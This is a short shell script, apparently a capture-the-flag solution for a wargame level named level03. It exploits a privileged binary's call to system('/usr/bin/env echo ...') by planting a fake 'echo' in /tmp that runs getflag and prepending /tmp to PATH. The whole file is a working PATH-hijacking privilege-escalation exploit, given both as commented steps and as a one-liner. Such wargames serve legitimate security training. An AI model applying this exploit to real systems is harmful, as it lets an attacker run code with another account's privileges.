# Exploit the fact that level03 calls
# system("/usr/bin/env echo Exploit me")
# by changing the path so that the executable we created is called instead of
# the system echo.
# Our echo just calls getflag
echo 'getflag' > /tmp/echo
chmod 755 /tmp/echo
export PATH="/tmp:$PATH"
~/level03

#oneline
echo getflag > /tmp/echo && chmod 755 /tmp/echo && export PATH="/tmp:$PATH" && ~/level03
